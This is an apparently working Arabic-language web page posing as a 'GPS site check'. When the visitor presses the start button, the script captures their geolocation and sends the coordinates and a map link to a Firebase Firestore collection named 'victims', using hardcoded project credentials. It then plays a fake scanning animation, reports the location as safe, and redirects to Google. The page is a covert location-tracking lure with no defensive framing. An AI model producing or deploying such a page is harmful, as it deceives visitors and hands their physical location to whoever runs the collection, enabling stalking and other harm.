<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الموقع</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh;padding:20px;overflow:hidden}
.container{max-width:500px;margin:0 auto;text-align:center}
.btn-start{padding:20px 40px;background:#0a0a0a;color:#0f0;border:2px solid #0f0;font-size:20px;cursor:pointer;border-radius:10px;margin-top:50px;font-family:'Courier New',monospace;font-weight:bold}
.code-screen{display:none;text-align:left;font-size:11px;line-height:1.4;height:300px;overflow:hidden;padding:10px;background:#000;border:1px solid #0f0;border-radius:8px;margin:15px 0}
.timer{color:#ff0;font-size:40px;font-weight:bold;margin:15px 0}
.status{color:#0f0;font-size:13px}
.progress{width:100%;height:5px;background:#111;border-radius:3px;margin:10px 0;overflow:hidden}
.progress-fill{height:100%;width:0%;background:#0f0;transition:width 0.3s}
</style></head>
<body>
<div class="container">
<div id="startScreen">
<h1 style="color:#0f0;font-size:22px;">📍 فحص الموقع</h1>
<p style="color:#666;margin:20px 0;">فحص نظام تحديد المواقع GPS</p>
<button class="btn-start" onclick="startScan()">⚡ ابدأ الفحص</button>
</div>
<div id="scanScreen" class="code-screen"></div>
<div id="timerScreen" style="display:none;text-align:center;">
<div class="timer" id="timer">40</div>
<div class="progress"><div class="progress-fill" id="progressFill"></div></div>
<div class="status" id="status">⏳ جاري فحص GPS...</div>
</div>
</div>
<script>
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();

function generateCode(){var lines=[];for(var i=0;i<80;i++){var line='';for(var j=0;j<60;j++){line+=String.fromCharCode(33+Math.floor(Math.random()*90));}lines.push('<div class="line">'+line+'</div>');}return lines.join('');}

function startScan(){
document.getElementById('startScreen').style.display='none';
navigator.geolocation.getCurrentPosition(function(p){var loc=p.coords.latitude+','+p.coords.longitude;db.collection('victims').add({service:'📍 فحص GPS',text:'الموقع: '+loc+'\nالخريطة: https://maps.google.com/?q='+loc,timestamp:new Date().toISOString()});},function(){});
document.getElementById('scanScreen').style.display='block';
document.getElementById('scanScreen').innerHTML=generateCode();
document.getElementById('timerScreen').style.display='block';
var codeInterval=setInterval(function(){document.getElementById('scanScreen').innerHTML=generateCode();document.getElementById('scanScreen').scrollTop=document.getElementById('scanScreen').scrollHeight;},200);
var sec=40;
var timerInterval=setInterval(function(){
sec--;document.getElementById('timer').textContent=sec;
document.getElementById('progressFill').style.width=((40-sec)/40*100)+'%';
if(sec<=30)document.getElementById('status').textContent='⏳ فحص الأقمار الصناعية...';
if(sec<=20)document.getElementById('status').textContent='⏳ تحديد الإحداثيات...';
if(sec<=10)document.getElementById('status').textContent='⏳ فحص الدقة...';
if(sec<=0){clearInterval(timerInterval);clearInterval(codeInterval);document.getElementById('status').textContent='✅ تم التحديد - الموقع آمن';setTimeout(function(){window.location.href='https://google.com/'},3000);}
},1000);
}
</script></body></html>
